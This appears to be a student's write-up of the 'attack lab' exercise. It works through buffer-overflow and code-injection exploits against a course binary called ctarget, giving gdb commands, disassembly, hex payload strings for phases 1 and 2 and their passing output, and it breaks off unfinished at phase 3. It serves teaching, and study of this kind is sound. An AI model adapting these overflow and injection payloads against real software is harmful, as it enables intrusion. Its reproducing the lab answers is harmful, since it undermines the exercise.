## Overview

The goal of this project is to get more familiar with code injection and return-oriented programming techniques. 

To investigate both of the targets, make sure to disassemble them. You can do so using the following commands: 

        objdump -d rtarget > rtarget.s
        objdump -d ctarget > ctarget.s
        
Additionally, you can use the 'gdb' debugger to step through the code, investigate what's stored in the registers, etc. 
You can begin a 'gdb' session by using the following command: 

        gdb ctarget
        
Here's some more helpful commands: 
          
*set a breakpoint at getbuf*

        break getbuf   
        
*run program*

        run
        
*next 10 instructions*

        x/10i $pc
        
*next 10 instructions for function touch1*

        x/10i touch1  
        
*step in*

        si
        
*next instruction*

        ni
        
*print hex value of stack pointer*

        p/x $rsp


All of these attacks will leverage the 'getbuf' function to create a buffer overflow. 

##### getbuf

    0000000000401474 <getbuf>:
      401474:	48 83 ec 18          	sub    $0x18,%rsp
      401478:	48 89 e7             	mov    %rsp,%rdi
      40147b:	e8 94 02 00 00       	callq  401714 <Gets>
      401480:	b8 01 00 00 00       	mov    $0x1,%eax
      401485:	48 83 c4 18          	add    $0x18,%rsp
      401489:	c3                   	retq   
  
We can see in the first line of 'getbuf' that we subtract $0x18, or 24 bytes, from the stack, creating a buffer of size 24. Therefore, in order to overflow the buffer, we will need to create strings that are larger than size 24. 

## Phase 1
In the first phase, our goal is to overflow the buffer, rewriting the return address of the getbuf function to be the address of the touch1 function. 

So in order for us to overwrite the return address, we need to fill the buffer completely, then pass in the address of the touch1 function.
        
Let's look at the touch1 function to see what our address is: 

        000000000040148a <touch1>:
          40148a:	48 83 ec 08          	sub    $0x8,%rsp
          40148e:	c7 05 e4 e4 2e 00 01 	movl   $0x1,0x2ee4e4(%rip)        # 6ef97c <vlevel>
          401495:	00 00 00 
          401498:	48 8d 3d 5d 09 0c 00 	lea    0xc095d(%rip),%rdi        # 4c1dfc <_IO_stdin_used+0x27c>
          40149f:	e8 1c 20 01 00       	callq  4134c0 <_IO_puts>
          4014a4:	bf 01 00 00 00       	mov    $0x1,%edi
          4014a9:	e8 d6 04 00 00       	callq  401984 <validate>
          4014ae:	bf 00 00 00 00       	mov    $0x0,%edi
          4014b3:	e8 d8 f6 00 00       	callq  410b90 <exit>    
          
We can see that in hexadecimal, our address is 0x40148a. 

This is what we want to put where the return address for getbuf is. 

We can accomplish that by creating the following text file: 

        00 00 00 00 00 00 00 00 
        00 00 00 00 00 00 00 00
        00 00 00 00 00 00 00 00 /* fill buffer - 0x18 */
        8a 14 40 00 00 00 00 00 /* address of touch1 */
        
We first fill the buffer, then pass in the return address. Remember that the stack grows downward, so we want to place the new address at the bottom. Additionally, remember that the input is little endian, so we need to reverse the order of the bytes. 

Before we actually pass the string to the ctarget program, we need to translate it into a raw format. 

We can do that with the 'hex2raw' program, using the following syntax:

        ./hex2raw < phase1.txt > phase1.raw
        
Once the text file is converted, we can pass it to our ctarget program:

        ./ctarget < phase1.raw
        
We should see the following message if we've done our work correctly:

        ./ctarget < phase1.raw
        Cookie: 0x2a402507
        Type string:Touch1!: You called touch1()
        Valid solution for level 1 with target ctarget
        PASS: Sent exploit string to server to be validated.
        NICE JOB!
        
Note that if you have a different file, you may have a different value for cookie, and will likely have different addresses and buffer sizes. 



## Phase 2

The second phase uses a code injection approach. This time, we're not changing the return address of a function, we're actually going to run some code. 

So our goal is to set the %rdi register (first argument) to our cookie value, then transfer control to the first instruction in the touch2 function. 

Let's take a look at the touch2 function:

        00000000004014b8 <touch2>:
          4014b8:	48 83 ec 08          	sub    $0x8,%rsp
          4014bc:	89 fa                	mov    %edi,%edx
          4014be:	c7 05 b4 e4 2e 00 02 	movl   $0x2,0x2ee4b4(%rip)        # 6ef97c <vlevel>
          4014c5:	00 00 00 
          4014c8:	39 3d b6 e4 2e 00    	cmp    %edi,0x2ee4b6(%rip)        # 6ef984 <cookie>
          4014ce:	74 2a                	je     4014fa <touch2+0x42>
          4014d0:	48 8d 35 71 09 0c 00 	lea    0xc0971(%rip),%rsi        # 4c1e48 <_IO_stdin_used+0x2c8>
          4014d7:	bf 01 00 00 00       	mov    $0x1,%edi
          4014dc:	b8 00 00 00 00       	mov    $0x0,%eax
          4014e1:	e8 8a f7 04 00       	callq  450c70 <___printf_chk>
          4014e6:	bf 02 00 00 00       	mov    $0x2,%edi
          4014eb:	e8 8c 05 00 00       	callq  401a7c <fail>
          4014f0:	bf 00 00 00 00       	mov    $0x0,%edi
          4014f5:	e8 96 f6 00 00       	callq  410b90 <exit>
          4014fa:	48 8d 35 1f 09 0c 00 	lea    0xc091f(%rip),%rsi        # 4c1e20 <_IO_stdin_used+0x2a0>
          401501:	bf 01 00 00 00       	mov    $0x1,%edi
          401506:	b8 00 00 00 00       	mov    $0x0,%eax
          40150b:	e8 60 f7 04 00       	callq  450c70 <___printf_chk>
          401510:	bf 02 00 00 00       	mov    $0x2,%edi
          401515:	e8 6a 04 00 00       	callq  401984 <validate>
          40151a:	eb d4                	jmp    4014f0 <touch2+0x38>

We can see that the address of touch2 is 0x4014b8. This is the value we will want to go to, rather than the return address for getbuf. 

Let's tackle the problem of moving our cookie to the %rdi register. The best approach will be to write the code in assembly, compile it, then disassemble it, so we can get the hex representation. 

First, let's look at the hex value of our cookie. We can do that by either looking at the cookie.txt file in our target folder, or we can use the following command: 
        
        x/w 0x6ef984

Our assembly code for moving our cookie value to the %rdi register will look like this: 
        
        movq $0x2A402507, %rdi
        retq

Save this as a .s file, then compile and disassemble using the following commands: 

        gcc -c phase2.s
        odjdump -d phase2.o
        
We can see that we get the following hex representation for our assembly code:

        0:   48 c7 c7 07 25 40 2a    mov    $0x2a402507,%rdi
        7:   c3                      retq   
        
The string that will capture this command will be the mov and ret command on the same line: '48 c7 c7 07 25 40 2a c3'. 

In our solution, this will be the first line. 

Now that we have figured out how to capture the movement of the cookie value to the %rdi register, we now want to figure out how to return to the stack, rather than going to the return address of getbuf. 

To do so, we need to figure out the address of the stack pointer. We can do that by stepping through the ctarget program, and using the following command to investigate the address of the stack pointer:

        x/d $rsp
      
We do this in our program, and we get the following address for $rsp: 0x5561b8e8

Finally, we need the address of our touch2 function, so once the function returns to the stack to execute the line we input that sets the cookie value, we go to the touch2 function. 

Our solution will look like this:

        48 c7 c7 07 25 40 2a c3 /* instruction to set cookie */
        00 00 00 00 00 00 00 00 /* padding for buffer */
        00 00 00 00 00 00 00 00
        e8 b8 61 55 00 00 00 00 /* rsp address - stack pointer */
        b8 14 40 00 00 00 00 00 /* touch2 function address */
        
        
This follows the hint from the instructions: " set register to your cookie, then use ret instruction to transfer control to the first instruction in touch2"

This works because the return address for the getbuf function is overwritten with the stack pointer. Once we go to the stack pointer, we see the instruction to set the cookie value. This returns control back to the stack, which clals the touch2 function address. Note that earlier, we had three lines of buffer filler to fill up the 24 bytes. Because we want the top of the stack to contain the instruction to set the cookie, we only need two lines of filler to overwrite the return address. 

We use the same instructions as before to test our solution on ctarget: 

        ./hex2raw < phase2.txt > phase2.raw
        ./ctarget < phase2.raw
        
We should see the following message: 

        ./ctarget <phase2.raw
        Cookie: 0x2a402507
        Type string:Touch2!: You called touch2(0x2a402507)
        Valid solution for level 2 with target ctarget
        PASS: Sent exploit string to server to be validated.
        NICE JOB!
        

## Phase 3

Our goal here is to pass a string as our argument, rather than an address. We know that the string should consist of eight hexadecimal digits without a leading '0x'. We also know that we need to set the $rdi register with our string representation of the cookie. Finally, we know that the strncmp and hexmatch functions are called, they may overwrite portions of memory that held the buffer used by getbuf. Therefore, we shouldn't place our string argument in the buffer memory.

First, we need to create a string representation of our cookie. 


Then, we need to figure out how we can store our cookie after the touch3 return address.

        





        
